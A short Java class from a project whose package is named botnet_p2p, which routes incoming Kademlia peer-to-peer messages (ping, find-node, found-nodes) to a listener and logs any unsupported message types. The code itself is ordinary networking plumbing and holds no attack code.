package botnet_p2p;

import botnet_p2p.kademlia.MessageListener;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.nio.channels.SocketChannel;

public class MessageHandler {
    private static final Logger logger = LogManager.getLogger(MessageHandler.class);


    private MessageListener messageListener;

    void handle(MessageOuterClass.Message message, SocketChannel sender) {
        switch (message.getType()) {
            case PING:
                this.messageListener.pingMessageReceived(message, sender);
                break;
            case FOUND_NODES:
                this.messageListener.foundNodesMessageReceived(message);
                break;
            case FIND_NODE:
                this.messageListener.findNodeMessageReceived(message,sender);
                break;
            default:
                logger.error("received message of unsupported type, type: " + message.getType());
        }
    }

    public void setFoundNodesListener(MessageListener foundNodeListener) {
        this.messageListener = foundNodeListener;
    }
}
